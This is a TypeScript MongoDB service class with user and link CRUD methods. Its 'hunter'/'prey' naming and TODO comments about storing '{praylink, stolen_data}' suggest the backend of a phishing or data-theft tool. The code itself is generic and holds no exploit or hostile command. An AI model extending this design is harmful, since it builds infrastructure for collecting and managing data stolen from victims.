import mongoDatabase from "../helper/mongodb.ts"
import { Bson, Service } from "deps";
import {} from "../model/mongoSchema.ts"
//import {serviceCollection} from "./services.ts";
import {UserSchema, LinkSchema} from "../model/mongoSchema.ts"

const usersCollection = mongoDatabase.collection<UserSchema>("users")
const linksCollection = mongoDatabase.collection<LinkSchema>("links")

//@Service()
class MongoService {

  constructor(
    private userCollection = usersCollection,
    private linkCollection = linksCollection
  ){}

  async createUser(username: string, hashedPassword: string, hunter: string) {
    
    const result = await this.userCollection.insertOne({
        username: username,
        hashedPassword: hashedPassword,
        roles: 79, //79 user, 33 admin
        hunter: hunter,
      });

      return result;
  }

    //TODO: We neeed a "CREATE" function to store the {praylink, stolen_data}
    
  async createLinks(hunter: string, prey: string, action: string) {
    const result = await this.linkCollection.insertOne({
        hunter: hunter,
        prey: prey,
        action: action,
      });
      return result;
  }

   // THIS SHOULD BE FINDING USERS EITHER BY EMAIL OR ID
  async findUser(type: string, username = "", _id?: Bson.ObjectId) {
    let userData = undefined;
    if (type === "id") {
        try {
            userData = await this.userCollection.findOne({ _id: _id });
            return userData;
          } catch (error) {
            error;
          }
    }else if (type === "email") {
        try {
            userData = await this.userCollection.findOne({ username: { $in: [username] } });
            return userData;
          } catch (error) {
            error;
        } 
    }
  }

  async associateHunter (hunter: string, _id: Bson.ObjectId) {
    await this.userCollection.updateOne(
      { _id:  _id },
      { $set: { hunter: hunter } },
    );
  }

    //TODO: We need to create update methods for changing password, to link a hunter ID into an account
  async update() {}
   
  async delete() {}
   /*TODO:
    Need to create a new collection called "preys". In there we'll store {praylink, stolen_data}. When we want to gather 
    the information we use the hunter link to find the prey link and then we aggregate the preys with:
        Aggregation
            const docs = await users.aggregate([
              { $match: { username: "many" } },
              { $group: { _id: "$username", total: { $sum: 1 } } },
            ]).toArray();
   */

}

//serviceCollection.addTransient(MongoService)

export default MongoService;